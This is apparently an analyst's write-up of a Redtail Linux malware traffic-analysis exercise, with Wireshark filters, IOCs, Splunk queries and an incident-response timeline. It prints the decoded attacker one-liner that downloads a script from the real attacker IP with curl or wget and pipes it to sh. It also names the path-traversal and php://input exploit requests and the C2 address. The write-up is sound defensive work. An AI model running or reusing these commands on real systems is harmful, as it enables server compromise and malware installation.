## overview 
---
**Date:** November 24, 2024
**Source:** [malware-traffic-analysis.net](https://www.malware-traffic-analysis.net/2024/11/24/index.html)- Redtail Case

Theme: Linux-focused threat â€” malicious Bash script delivering architecture-specific ELF payloads and establishing C2

---

##  Step 1: Download and Extract Investigation Files

Downloaded the following from the case study page:

- `2024-11-24-webserver-scans-and-probes.pcap.zip`
- `2024-11-24-infection-by-Redtail-bash-script-from-45.202.35_190.pcap.zip`
- `2024-11-24-Redtail-bash-script-and-malware-from-45.202.35_190.zip`

**Unzipped with password:** `infected_20241124`

### ðŸ“¦ Artifacts:

- `.pcap` files of:
  - Webserver scans
  - Post-infection traffic
- Malicious payloads:
  - Initial Bash script (`.sh`)
  - Cleanup script (`clean`)
  - ELF binary malware payloads:
    - `x86_64` version
    - `armv7` version
    - Other architecture variants
---
## Step 2: Analyze Initial Probing in Wireshark

**Opened:** `2024-11-24-webserver-scans-and-probes.pcap`

```
ip contains "45.202.35.190" or urlencoded-form contains "dHdHR0Vi8NDUuMjAyLmljLmljLjE5MC9zaCA="
```

<img width="1717" height="847" alt="image" src="https://github.com/user-attachments/assets/b5ccd7e0-ae15-4118-bba4-b74ae61a7039" />

###  Observed Activity:
Multiple external IPs were seen sending crafted HTTP `POST` requests targeting:

- `/cgi-bin/.%2e/.%2e/.../bin/sh`
- `/hello.world?...auto_prepend_file=php://input`

 These are **exploitation attempts** involving:
- **Path Traversal**
- **Remote Code Execution (RCE)** vulnerabilities

###  Key Exploits Identified:
- Apache backdoor access via `bin/sh`
- PHP payload injection using `php://input`

 **Objective:** To push and execute a malicious shell script hosted at:  
`http://45.202.35[.]190/sh`

Decoded Payload:

```bash
X=$(curl http://45.202.35.190/sh || wget http://45.202.35.190/sh -O-); echo "$X" | sh -s
```
---
##  Step 3: Analyze Post-Infection Traffic

** Opened:** `2024-11-24-infection-by-Redtail-bash-script-from-45.202.35_190.pcap`

```
http.request or tls.handshake.type eq 1 or (tcp.flags eq 0x0002 and !(ip.addr eq 45.202.35.190 or ip.addr eq 95.215.19.53))
```

<img width="1095" height="586" alt="image" src="https://github.com/user-attachments/assets/e2cc5bdb-b012-4232-a4ee-60ae845b04fa" />

###  Behavior Summary:

- Target host retrieves the malicious shell script from:  
  `http://45.202.35[.]190/sh`
- The Bash script:
  - Detects system architecture (`x86_64`, `armv7`, etc.)
  - Selects and downloads the appropriate ELF binary
  - Renames the downloaded binary to `.redtail`
  - Executes `.redtail`
  - Performs cleanup operations to erase traces

### Screenshot Evidence Highlights:

- **Bash Script Breakdown (`sh`)**
  - Scans for `noexec` mount points
  - Writes test files to determine executable directories
  - Downloads correct ELF binary using `curl` or `wget`
  - Executes the ELF binary with the name `.redtail`
  - Cleans up using: `rm -rf /tmp/...`

###  Goal of the Malware:
Achieve **persistent execution** of architecture-specific ELF payloads while ensuring stealth through cleanup and trace removal.

---
## Step 4: Confirm Payload Delivered

**Viewed HTTP Stream for:** `/x86_64`

```
http.request.uri contains "/x86_64"
```

<img width="1726" height="902" alt="image" src="https://github.com/user-attachments/assets/dca9df9c-335c-4146-82db-872451ef3951" />


### ðŸ§¾ File Info:

- **File Type:** ELF 64-bit LSB executable
- **SHA256 Hash:**  
  `29f8524562c2436f42019e0fc473bd88584234c57979c7375c1ace3648784e4b`
- **Size:** 1.6 MB (UPX packed)
- **Purpose:** Likely Redtail backdoor or scanner payload  
  Delivered after initial infection via Bash script

---

##  Step 5: Behavior After Execution

###  Infected Host Activity:

-  Initiates **DNS over TLS** (`TCP port 853`) to multiple **public DNS servers**
```
tcp.dstport == 853 
```
<img width="1706" height="875" alt="image" src="https://github.com/user-attachments/assets/ea881cda-f414-41fd-816e-3fd9f685e3c5" />

The infected host initiates **DNS over TLS** requests using **TCP port 853** to various public DNS servers.  
This behavior is commonly seen in malware attempting to perform **stealthy DNS resolution** via encrypted channels.

-  Performs **SYN scanning** using high source port `43782`

```
ip.src == 10.11.24.101 and tcp.flags.syn == 1 and tcp.flags.ack == 0
```
<img width="1716" height="855" alt="image" src="https://github.com/user-attachments/assets/7703bd1b-90f6-4609-96eb-f623bbf9e21b" />

Post infection, the host begins active SYN scanning on various public IP addresses using a high source port (43782).This is typically used by malware for network reconnaissance and lateral movement preparation.

-  Establishes **encrypted connection** to:
  - `87.120.113.231:43782` (likely C2 server)
```
ip.addr == 87.120.113.231 and tcp.port == 43782
```
<img width="1727" height="831" alt="image" src="https://github.com/user-attachments/assets/cb8badf5-c83c-4b1c-a9e0-094b22fcb50f" />

The infected host establishes a persistent, encrypted connection with the IP 87.120.113.231 over TCP port 43782.This suggests C2 beaconing or data exfiltration from the compromised host to the attacker's infrastructure.

---

### ðŸ“¸ Screenshot: Attack Chain Summary (ATT&CK Flow)

| Phase             | Activity                                                                 |
|------------------|--------------------------------------------------------------------------|
| Initial Access    | Exploits using `POST` to `/cgi-bin/.../bin/sh` and `/hello.world?...php://input` |
| Execution         | Bash script fetched from `http://45.202.35[.]190/sh` using `curl/wget`  |
| Persistence       | Executes downloaded ELF, saves as `.redtail`                            |
| Defense Evasion   | Deletes traces, avoids `noexec` directories                             |
| Command & Control | Connects to `87.120.113.231:43782` via encrypted TCP stream             |
| Discovery/Recon   | Scans public DNS servers (`TCP 853`) and launches wide SYN scan activity|

---

## ðŸ§¾ Step 6: Extracted Indicators of Compromise (IOCs)

| **Type**          | **Value**                                                                 |
|-------------------|---------------------------------------------------------------------------|
| **IPs**           | `45.202.35.190`, `87.120.113.231`                                         |
| **Domains**       | *(None - IP-only C2 and downloads)*                                       |
| **Bash Script URL**   | `http://45.202.35.190/sh`                                                 |
| **ELF Payload URL**   | `http://45.202.35.190/x86_64`                                            |
| **SHA256 - Script**   | `aed29398112ad074b8fd8a2e25020fb01db1f8cdaff86326222529dbeba5746b`        |
| **SHA256 - Payload** | `29f8524562c2436f42019e0fc473bd88584234c57979c7375c1ace3648784e4b`        |
| **Ports**         | `43782` (C2), `853` (DNS over TLS)                                       |

---

## Step 7: Detection in Splunk (Simulated)

Convert PCAP to JSON for Splunk:

```bash
tshark -r 2024-11-24-infection-by-Redtail-bash-script-from-45.202.35_190.pcap -T json > redtail-pcap.json
```

<img width="1725" height="522" alt="image" src="https://github.com/user-attachments/assets/f60733bd-7c97-4712-a2fe-e7778b59f305" />

### Sample Splunk Queries

Detect Connection to Redtail Host
```spl
source="redtail-pcap.json" host="localhost" "45.202.35.190"
```
<img width="1720" height="868" alt="image" src="https://github.com/user-attachments/assets/bc4ed996-537c-429e-ba98-1d0af2776503" />

Detect Encrypted Traffic to Port 43782

```spl
source="redtail-pcap.json" host="localhost" 43782 OR 43782
```

<img width="1725" height="792" alt="image" src="https://github.com/user-attachments/assets/ebd0d453-b318-4c0f-b26e-5dee12d12b7b" />

---

##  Step 8: Incident Response Lifecycle (Redtail)

###  Preparation
- Hardened Linux endpoints with syscall monitoring  
- Restricted usage of `wget` and `curl` in `cron` and sensitive system paths  

---

###  Identification
- Alerts triggered by unusual outbound traffic on port `43782`  
- EDR flagged unknown ELF execution with `.redtail` filename  
- Detected use of `curl/wget` downloading from an external IP (`45.202.35.190`)  

---

###  Containment
- Blocked malicious IPs:
  - `45.202.35.190`
  - `87.120.113.231`
- Isolated affected VM/container  
- Disabled outbound usage of `curl` and `wget`  

---

###  Eradication
- Deleted `.redtail` and related ELF binaries  
- Removed dropped files from `/tmp` and `/dev/shm`  
- Rebooted system using a clean VM image  

---

###   Recovery
- Verified integrity of kernel modules and cron jobs  
- Checked for lateral movement (none detected)  
- Re-enabled necessary services after full system scan  

---

###  Lessons Learned
- Monitor for use of legacy CGI paths like `/cgi-bin/`  
- Alert on Bash script downloads from unknown external IPs  
- Build detection rules for:
  - `.redtail` binary patterns  
  - Suspicious ELF files in `/tmp` or `/dev/shm`  

---

###  Timeline of Events (UTC)

| **Time**             | **Event**                                                  |
|----------------------|------------------------------------------------------------|
| 2024-11-23 22:23     | Redtail exploit attempt seen in web server logs            |
| 2024-11-24 06:11     | Host fetched `/sh` â†’ `/x86_64` binary from attacker server |
| 2024-11-24 06:12     | SYN scanning and encrypted C2 communication started        |
| 2024-11-24 07:00     | Alert triggered on outbound port `43782`                   |
| 2024-11-24 07:15     | IR initiated and infected host isolated                    |

---
